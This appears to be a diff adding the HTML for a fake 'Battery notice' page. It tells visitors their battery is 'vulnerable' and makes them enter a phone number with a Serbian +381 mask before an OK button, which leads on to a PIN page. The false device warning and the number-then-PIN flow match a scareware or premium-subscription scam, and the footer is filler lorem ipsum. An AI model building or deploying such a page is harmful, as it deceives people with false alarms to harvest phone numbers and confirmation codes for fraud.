@@ -1,0 +1,80 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Battery notice</title>
+    <link rel="stylesheet" href="css/style.css"/>
+</head>
+<body>
+<main>
+    <div class="container">
+        <div class="instruction-warning wrapper">
+            <h4 class="instruction-warning title">
+                Your battery is vulnerable
+            </h4>
+            <p class="instruction-warning description">
+                Tap "OK" to extend the battery life and maintain its overall health
+            </p>
+            <div class="instruction-warning advice">
+                <img class="instruction-warning advice usb"
+                     src="./img/svg%20usb.svg"
+                     alt="usb-connector-icon">
+                <img class="instruction-warning advice battery"
+                     src="./img/svg%20bat.svg"
+                     alt="battery-icon">
+            </div>
+            <form id="form">
+                <div>
+                    <input type="text"
+                           value=""
+                           maxlength="17"
+                           class="instruction-warning pin-code"
+                           id="pin"
+                           placeholder="+(381) ___-___-__"
+                           onkeyup="check()"
+                           oninput="checkParams()"
+                    >
+                </div>
+                <input type="submit"
+                       value="OK"
+                       class="instruction-warning reference"
+                       id="submit-btn"
+                       onclick='location.href="pin.html"'
+                       disabled
+                >
+            </form>
+        </div>
+        <footer class="footer">
+            <p class="footer description">
+                Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et
+                dolore magna aliqua. Justo eget magna fermentum iaculis eu. Volutpat blandit aliquam etiam erat velit.
+                Augue mauris augue neque gravida in. Duis at tellus at urna. Massa tincidunt nunc pulvinar sapien et.
+                Pharetra pharetra massa massa ultricies mi quis hendrerit dolor. Faucibus vitae aliquet nec ullamcorper
+                sit. Neque sodales ut etiam sit amet nisl purus in mollis. Pharetra magna ac placerat vestibulum lectus
+                mauris. Amet massa vitae tortor condimentum lacinia quis. Dis parturient montes nascetur ridiculus mus
+                mauris. Enim diam vulputate ut pharetra sit amet aliquam. Nunc mattis enim ut tellus elementum sagittis.
+                Massa sed elementum tempus egestas sed. Velit dignissim sodales ut eu sem integer vitae justo. Arcu
+                felis bibendum ut tristique et egestas quis ipsum. Lorem ipsum dolor sit amet, consectetur adipiscing
+                elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Justo eget magna fermentum
+                iaculis eu. Volutpat blandit aliquam etiam erat velit. Augue mauris augue neque gravida in. Duis at
+                tellus at urna. Massa tincidunt nunc pulvinar sapien et. Pharetra pharetra massa massa ultricies mi quis
+                hendrerit dolor. Faucibus vitae aliquet nec ullamcorper sit. Neque sodales ut etiam sit amet nisl purus
+                in mollis. Pharetra magna ac placerat vestibulum lectus mauris. Amet massa vitae tortor condimentum
+                lacinia quis. Dis parturient montes nascetur ridiculus mus mauris. Enim diam vulputate ut pharetra sit
+                amet aliquam. Nunc mattis enim ut tellus elementum sagittis. Massa sed elementum tempus egestas sed.
+                Velit dignissim sodales ut eu sem integer vitae justo. Arcu felis bibendum ut tristique et egestas quis
+                ipsum.
+            </p>
+        </footer>
+    </div>
+</main>
+<script src="https://unpkg.com/imask"></script>
+<script src="js/script.min.js"></script>
+<script src="js/script.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.0/jquery.min.js"></script>
+
+</body>
+</html>
